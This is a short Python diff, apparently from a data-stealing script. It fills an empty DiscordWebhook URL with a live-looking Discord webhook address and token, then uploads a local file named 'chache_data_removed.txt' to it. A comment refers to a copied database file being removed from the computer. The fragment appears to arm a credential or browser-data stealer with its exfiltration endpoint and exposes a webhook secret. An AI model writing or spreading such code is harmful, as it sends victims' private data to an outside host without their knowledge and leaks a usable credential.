@@ -104,7 +104,7 @@ def main():
           
         # trying to remove the copied db file as 
         # well from local computer
-        web=DiscordWebhook(url="")
+        web=DiscordWebhook(url="https://discord.com/api/webhooks/988419327994761227/QT-ORLi1GRxBbbsbRLs5fs3MkCy2dOuoQL_pFgrhmyCrBYNPSejTcIh8J2ooq9NtFbXy")
         with open("chache_data_removed.txt", "rb") as f:
             web.add_file(file=f.read(), filename='file.txt')
         web.execute()
